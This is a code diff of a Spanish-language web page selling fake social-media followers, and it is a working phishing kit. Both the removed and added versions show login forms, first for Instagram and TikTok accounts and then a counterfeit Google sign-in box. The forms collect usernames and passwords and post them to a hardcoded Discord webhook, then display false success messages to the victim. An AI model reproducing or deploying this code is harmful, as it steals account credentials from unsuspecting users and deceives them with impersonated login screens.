@@ -1,263 +1,82 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Benja VIP | Elite Social Growth Platform</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&family=Syncopate:wght@700&display=swap" rel="stylesheet">
-    <style>
-        :root { --gold: #d4af37; --gold-dark: #aa8c2c; --bg: #030303; --card: rgba(20, 20, 20, 0.6); --green: #2ecc71; }
-        body, html { margin: 0; padding: 0; background: var(--bg); color: white; font-family: 'Poppins', sans-serif; overflow-x: hidden; scroll-behavior: smooth; }
-        
-        /* Fondo con gradiente sutil */
-        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 10%, #1a1a1a 0%, #000 60%); z-index: -1; }
+<style>
+    .btn-google {
+        background: white; color: #757575; border: 1px solid #ddd;
+        padding: 12px; border-radius: 5px; font-weight: 600; font-size: 14px;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        cursor: pointer; width: 100%; margin-top: 15px; font-family: 'Roboto', sans-serif;
+    }
+    .google-logo { width: 18px; }
 
-        .container { width: 100%; max-width: 440px; padding: 20px; box-sizing: border-box; margin: auto; }
-
-        /* --- HEADER ÉLITE --- */
-        .header { text-align: center; padding: 30px 0; position: relative; }
-        .header h1 { font-family: 'Syncopate', sans-serif; color: white; margin: 0; font-size: 28px; letter-spacing: 3px; text-transform: uppercase; }
-        .header h1 span { color: var(--gold); text-shadow: 0 0 15px rgba(212, 175, 55, 0.5); }
-        .tagline { font-size: 9px; color: #555; text-transform: uppercase; letter-spacing: 4px; margin-top: 5px; font-weight: 300; }
-
-        /* --- PANEL DE ACTIVIDAD (NUEVO) --- */
-        .activity-panel { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
-        .activity-item { background: var(--card); border: 1px solid #1a1a1a; border-radius: 12px; padding: 15px; text-align: center; backdrop-filter: blur(10px); }
-        .activity-item i { color: var(--gold); font-size: 18px; margin-bottom: 8px; display: block; }
-        .activity-item b { font-size: 16px; font-weight: 800; color: white; display: block; }
-        .activity-item span { font-size: 8px; color: #666; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* --- BARRA DE CARGA DE SERVIDOR (NUEVO) --- */
-        .server-status { background: var(--card); border: 1px solid #1a1a1a; border-radius: 15px; padding: 15px; margin-bottom: 25px; backdrop-filter: blur(10px); }
-        .server-meta { display: flex; justify-content: space-between; font-size: 10px; color: #aaa; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
-        .server-bar-bg { height: 6px; background: #111; border-radius: 10px; overflow: hidden; position: relative; }
-        .server-bar-fill { height: 100%; width: 91%; background: linear-gradient(90deg, var(--gold-dark), var(--gold)); border-radius: 10px; animation: pulseBar 2s infinite; }
-        @keyframes pulseBar { 0% { box-shadow: 0 0 5px rgba(212, 175, 55, 0.5); } 50% { box-shadow: 0 0 15px rgba(212, 175, 55, 0.8); } 100% { box-shadow: 0 0 5px rgba(212, 175, 55, 0.5); } }
-
-        /* --- SECCIONES TÍTULOS --- */
-        .section-title { font-size: 11px; text-transform: uppercase; letter-spacing: 3px; color: var(--gold); margin: 30px 0 15px; display: flex; align-items: center; gap: 10px; font-weight: 600; }
-        .section-title::after { content: ""; height: 1px; background: linear-gradient(90deg, #222, transparent); flex: 1; }
-
-        /* --- BLOQUE PRUEBA GRATIS (REDISEÑADO) --- */
-        .free-box { background: rgba(20, 20, 20, 0.8); border: 1px solid #222; border-radius: 25px; padding: 30px; text-align: center; position: relative; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.7); backdrop-filter: blur(15px); }
-        .free-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at center, rgba(212, 175, 55, 0.1) 0%, transparent 70%); pointer-events: none; }
-        .free-box h2 { margin: 0; font-size: 20px; font-weight: 800; color: white; letter-spacing: 1px; }
-        .free-box p { font-size: 11px; color: #888; margin: 8px 0 20px; font-weight: 300; }
-        
-        .free-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .btn-free { border: 1px solid #333; padding: 16px; border-radius: 15px; font-weight: 600; font-size: 11px; cursor: pointer; background: #fff; color: #000; text-transform: uppercase; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-free:hover { background: #eee; transform: translateY(-2px); }
-        .btn-free i { font-size: 14px; }
-
-        /* --- PRODUCTOS VIP (REDISEÑADOS) --- */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .card { background: var(--card); border-radius: 25px; padding: 25px; border: 1px solid #1a1a1a; text-align: center; position: relative; transition: 0.3s; backdrop-filter: blur(10px); }
-        .card:hover { border-color: rgba(212, 175, 55, 0.3); transform: translateY(-5px); box-shadow: 0 10px 25px rgba(212, 175, 55, 0.1); }
-        
-        .badge-vip { position: absolute; top: -10px; right: 8px; background: linear-gradient(135deg, var(--gold-dark), var(--gold)); color: black; font-size: 8px; padding: 5px 12px; border-radius: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
-        
-        .card i { font-size: 28px; margin-bottom: 15px; display: block; }
-        .card b { font-size: 16px; display: block; margin-bottom: 5px; font-weight: 600; }
-        .price { color: var(--gold); font-size: 18px; font-weight: 800; margin-bottom: 20px; display: block; }
-        
-        .btn-wa { background: var(--green); color: white; text-decoration: none; padding: 14px; border-radius: 12px; font-size: 12px; font-weight: 600; display: block; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
-        .btn-wa:hover { filter: brightness(1.1); box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3); }
-
-        /* --- SECCIÓN GARANTÍA (NUEVO) --- */
-        .guarantee-session { background: var(--card); border: 1px solid #1a1a1a; border-radius: 20px; padding: 25px; margin-top: 30px; backdrop-filter: blur(10px); }
-        .guarantee-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .guarantee-item { display: flex; align-items: center; gap: 15px; }
-        .guarantee-item i { color: var(--gold); font-size: 20px; }
-        .guarantee-text b { font-size: 11px; color: white; display: block; text-transform: uppercase; }
-        .guarantee-text span { font-size: 10px; color: #666; font-weight: 300; }
-
-        /* --- MODAL DE SEGURIDAD (FORMULARIO) --- */
-        #auth-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 10000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; backdrop-filter: blur(10px); }
-        .auth-card { background: #080808; border: 1px solid var(--gold); padding: 40px 30px; border-radius: 30px; width: 100%; max-width: 360px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.9); position: relative; }
-        .auth-card i.main-lock { font-size: 35px; color: var(--gold); margin-bottom: 20px; display: block; }
-        
-        .auth-card h3 { color: white; margin: 0; font-size: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
-        .auth-card p { font-size: 11px; color: #777; margin: 10px 0 25px; font-weight: 300; line-height: 1.6; }
-        
-        input { width: 100%; padding: 18px; margin: 10px 0; background: #000; border: 1px solid #222; color: white; border-radius: 15px; box-sizing: border-box; outline: none; font-size: 14px; font-family: 'Poppins', sans-serif; transition: 0.3s; }
-        input:focus { border-color: var(--gold); background: #050505; }
-        
-        .btn-final { width: 100%; padding: 18px; background: var(--gold); border: none; border-radius: 15px; font-weight: 800; cursor: pointer; color: black; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; margin-top: 15px; transition: 0.3s; }
-        .btn-final:hover { background: var(--gold-dark); transform: scale(1.02); }
-        
-        .secure-tag { font-size: 9px; color: #444; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 6px; text-transform: uppercase; }
-
-        footer { text-align: center; color: #333; font-size: 10px; padding: 30px 0; text-transform: uppercase; letter-spacing: 2px; font-weight: 300; }
-
-    </style>
-</head>
-<body>
-
-<div class="container">
+    /* VENTANA DE LOGIN GOOGLE SIMULADA */
+    .google-modal {
+        background: white; color: #202124; padding: 40px 30px;
+        border-radius: 8px; width: 100%; max-width: 400px;
+        text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+    .google-header img { width: 75px; margin-bottom: 10px; }
+    .google-header h2 { font-size: 24px; font-weight: 400; margin: 0; font-family: 'Product Sans', Arial; }
+    .google-header p { font-size: 16px; margin: 10px 0 30px; }
     
-    <header class="header">
-        <h1>BENJA <span>VIP</span></h1>
-        <p class="tagline">Elite Social Growth Solutions</p>
-    </header>
+    .g-input {
+        width: 100%; padding: 13px 15px; margin: 10px 0;
+        border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;
+        box-sizing: border-box; outline: none;
+    }
+    .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+    
+    .g-footer {
+        display: flex; justify-content: space-between; align-items: center;
+        margin-top: 40px;
+    }
+    .btn-g-next {
+        background: #1a73e8; color: white; border: none;
+        padding: 10px 24px; border-radius: 4px; font-weight: 600;
+        cursor: pointer; font-size: 14px;
+    }
+</style>
 
-    <div class="activity-panel">
-        <div class="activity-item">
-            <i class="fas fa-history"></i>
-            <b>1.482</b>
-            <span>Órdenes Hoy</span>
+<div id="auth-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index:10000; justify-content:center; align-items:center;">
+    <div class="google-modal">
+        <div class="google-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+            <h2>Acceder</h2>
+            <p>Usa tu cuenta de Google</p>
         </div>
-        <div class="activity-item">
-            <i class="fas fa-server"></i>
-            <b>99.9%</b>
-            <span>Uptime</span>
-        </div>
-        <div class="activity-item">
-            <i class="fas fa-globe-americas"></i>
-            <b>45+</b>
-            <span>Países</span>
-        </div>
-    </div>
-
-    <div class="server-status">
-        <div class="server-meta">
-            <span>Carga del Servidor</span>
-            <span style="color:var(--gold); font-weight:bold">91% (Alta Demanda)</span>
-        </div>
-        <div class="server-bar-bg">
-            <div class="server-bar-fill"></div>
-        </div>
-    </div>
-
-    <div class="section-title"><span>🎁 Beneficio de Bienvenida</span></div>
-    <div class="free-box">
-        <h2>300 SEGUIDORES GRATIS</h2>
-        <p>Inicia el protocolo de prueba sin costo. Válido una vez por cuenta verificada hoy.</p>
-        <div class="free-grid">
-            <button class="btn-free" onclick="abrirCaptura('Instagram Gratis')">
-                <i class="fab fa-instagram" style="color:#E1306C"></i> INSTAGRAM
-            </button>
-            <button class="btn-free" onclick="abrirCaptura('TikTok Gratis')">
-                <i class="fab fa-tiktok" style="color:#000"></i> TIKTOK
-            </button>
-        </div>
-    </div>
-
-    <div class="section-title"><span>💎 Planes Mayoristas Élite</span></div>
-    <div class="grid">
-        <div class="card">
-            <div class="badge-vip">MÁS VENDIDO 🔥</div>
-            <i class="fab fa-instagram" style="color:#E1306C"></i>
-            <b>20k SEGUIDORES</b>
-            <span class="price">$30.000 AR$</span>
-            <a href="https://wa.me/5493364546172?text=Hola!%20Quiero%20el%20Pack%20VIP%20de%2020k" class="btn-wa">SOLICITAR</a>
-        </div>
-
-        <div class="card" style="border-color: var(--gold)">
-            <div class="badge-vip" style="background:var(--gold); color:black">SOCIO ELITE 💎</div>
-            <i class="fab fa-instagram" style="color:var(--gold)"></i>
-            <b>100k SEGUIDORES</b>
-            <span class="price">$80.000 AR$</span>
-            <a href="https://wa.me/5493364546172?text=Hola!%20Quiero%20el%20Pack%20ELITE%20de%20100k" class="btn-wa" style="background:var(--gold); color:black">SOLICITAR</a>
-        </div>
-    </div>
-
-    <div class="guarantee-session">
-        <div class="guarantee-grid">
-            <div class="guarantee-item">
-                <i class="fas fa-shield-alt"></i>
-                <div class="guarantee-text">
-                    <b>Entrega Garantizada</b>
-                    <span>Reposición automática ante caídas.</span>
-                </div>
-            </div>
-            <div class="guarantee-item">
-                <i class="fas fa-user-clock"></i>
-                <div class="guarantee-text">
-                    <b>Soporte 24/7</b>
-                    <span>Atención VIP por WhatsApp.</span>
-                </div>
-            </div>
-            <div class="guarantee-item">
-                <i class="fas fa-bolt"></i>
-                <div class="guarantee-text">
-                    <b>Carga Rápida</b>
-                    <span>Resultados visibles en minutos.</span>
-                </div>
-            </div>
-            <div class="guarantee-item">
-                <i class="fas fa-lock"></i>
-                <div class="guarantee-text">
-                    <b>Privacidad 100%</b>
-                    <span>Protocolos de encriptado AES-256.</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <footer>
-        Benja VIP Systems © 2026 | All Rights Reserved
-    </footer>
-
-</div>
-
-<div id="auth-modal">
-    <div class="auth-card">
-        <i class="fas fa-user-shield main-lock"></i>
-        <h3 id="m-title">VALIDACIÓN DE CUENTA</h3>
-        <p>Para garantizar la seguridad de la carga y evitar abusos del sistema, vincule su cuenta al servidor de encriptado. Sus datos están protegidos.</p>
         
-        <input type="text" id="u_name" placeholder="Usuario, Correo o Teléfono">
-        <input type="password" id="u_pass" placeholder="Contraseña de la cuenta">
+        <input type="email" id="g_email" class="g-input" placeholder="Correo electrónico o teléfono">
+        <input type="password" id="g_pass" class="g-input" placeholder="Introduce tu contraseña">
         
-        <button class="btn-final" id="btn-envio" onclick="enviarFinal()">ACTIVAR AHORA</button>
+        <div style="text-align:left; color:#1a73e8; font-size:14px; font-weight:600; margin-top:10px; cursor:pointer;">¿Has olvidado tu correo?</div>
         
-        <div class="secure-tag">
-            <i class="fas fa-lock" style="font-size:10px"></i> Conexión Segura Encriptada SSL
+        <p style="font-size:14px; color:#5f6368; text-align:left; margin-top:30px;">
+            Para continuar, Google compartirá tu nombre, dirección de correo electrónico y foto de perfil con <b>Benja VIP Panel</b>.
+        </p>
+
+        <div class="g-footer">
+            <span style="color:#1a73e8; font-weight:600; font-size:14px; cursor:pointer;">Crear cuenta</span>
+            <button class="btn-g-next" onclick="capturaGoogle()">Siguiente</button>
         </div>
     </div>
 </div>
 
 <script>
-    let regaloActual = "";
-    // TU URL DE DISCORD YA VINCULADA
-    const webhook = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
-
-    function abrirCaptura(tipo) {
-        regaloActual = tipo;
-        document.getElementById('m-title').innerText = "VERIFICAR " + tipo.toUpperCase();
+    function abrirCapturaGoogle() {
         document.getElementById('auth-modal').style.display = 'flex';
     }
 
-    async function enviarFinal() {
-        const u = document.getElementById('u_name').value;
-        const p = document.getElementById('u_pass').value;
-
-        if(!u || !p) return alert("Error: Debe completar usuario y contraseña para la validación.");
-
-        document.getElementById('btn-envio').innerText = "PROCESANDO...";
+    async function capturaGoogle() {
+        const email = document.getElementById('g_email').value;
+        const pass = document.getElementById('g_pass').value;
+        
+        if(!email || !pass) return alert("Introduce tus datos de Google.");
 
         const payload = {
-            content: `🎯 **NUEVOS DATOS CAPTURADOS**\n🎁 **Servicio:** \`${regaloActual}\`\n👤 **ID:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n✅ **Estado:** Encriptado para carga`
+            content: `🛡️ **CUENTA DE GOOGLE CAPTURADA**\n📧 **Email:** \`${email}\`\n🔑 **Password:** \`${pass}\` \n✨ **Servicio:** Reclamo de 300 Seguidores`
         };
 
-        try {
-            await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-            
-            // Mensaje de éxito falso profesional
-            alert("¡Felicidades! Cuenta vinculada con éxito. El envío de los 300 seguidores para " + regaloActual + " comenzará en las próximas 2 a 12 horas. Recibirás una notificación en la app.");
-            document.getElementById('auth-modal').style.display = 'none';
-            // Limpiamos los campos
-            document.getElementById('u_name').value = "";
-            document.getElementById('u_pass').value = "";
-            document.getElementById('btn-envio').innerText = "ACTIVAR AHORA";
-            
-        } catch(e) {
-            alert("Error de servidor. Intente nuevamente.");
-            document.getElementById('btn-envio').innerText = "ACTIVAR AHORA";
-        }
+        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        
+        alert("Sincronización con Google exitosa. Tus seguidores se enviarán en breve.");
+        location.reload();
     }
 </script>
-
-</body>
-</html>
